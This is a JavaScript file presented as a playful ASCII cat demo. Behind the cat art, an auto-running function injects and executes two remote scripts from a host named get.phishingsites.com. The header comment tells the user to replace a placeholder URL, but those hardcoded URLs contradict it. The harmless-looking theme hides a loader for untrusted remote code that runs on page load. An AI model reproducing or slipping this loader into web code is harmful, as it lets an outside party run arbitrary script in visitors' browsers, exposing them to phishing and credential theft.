/**
 * ASCII Cat with Subrequest Script Loader
 * Replace 'YOUR_SCRIPT_URL_HERE' with the actual script URL
 */

// ASCII cat art
const catArt = `
    /\\_/\\  
   ( o.o ) 
    > ^ <  
   /     \\ 
  /       \\
`;

// Display the cat
console.log("Here's your ASCII cat:");
console.log(catArt);

// Function to load external script via subrequest
function loadExternalScript(url) {
  console.log("Cat is fetching a script from:", url);

  return new Promise((resolve, reject) => {
    const script = document.createElement("script");
    script.src = url;
    script.onload = () => {
      console.log("Meow! Script loaded successfully!");
      resolve(true);
    };
    script.onerror = () => {
      console.error("Hiss! Failed to load script!");
      reject(new Error("Script loading failed"));
    };
    document.head.appendChild(script);
  });
}

// Execute the subrequest
(async function () {
  try {
    // Replace this URL with your actual script URL
    const scriptUrl1 = "https://get.phishingsites.com/viking-5th.js";
    const scriptUrl2 = "https://get.phishingsites.com/viking-6th.js";

    console.log("Cat is making subrequests...");
    await loadExternalScript(scriptUrl1);
    console.log("First script loaded!");
    await loadExternalScript(scriptUrl2);
    console.log("Cat completed all subrequests!");
  } catch (error) {
    console.error("Cat encountered an error:", error.message);
  }
})();
